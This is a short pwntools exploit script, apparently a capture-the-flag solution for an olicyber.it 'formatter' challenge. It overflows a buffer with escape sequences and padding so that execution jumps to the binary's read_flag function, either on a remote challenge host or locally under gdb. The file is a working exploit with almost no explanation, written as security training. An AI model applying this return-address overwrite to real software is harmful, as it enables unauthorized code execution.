#!/usr/bin/env python3
from pwn import *

elf = ELF('./formatter')
if args.REMOTE:
    r = remote('formatter.challs.olicyber.it', 20006)
else:
    r = gdb.debug('./formatter', '''
        b *0x40132F
        c
    ''')

PAYLOAD = b'\\h' * 12 + b'a' * 32 + p64(elf.sym['read_flag'])
# 20 * 4 = 48 + 32 = offset of ret

if args.REMOTE:
    r.recvuntil(b'stringhe.\n')
else:
    r.recvuntil(b'formattata!\n')

r.sendline(PAYLOAD)
r.interactive()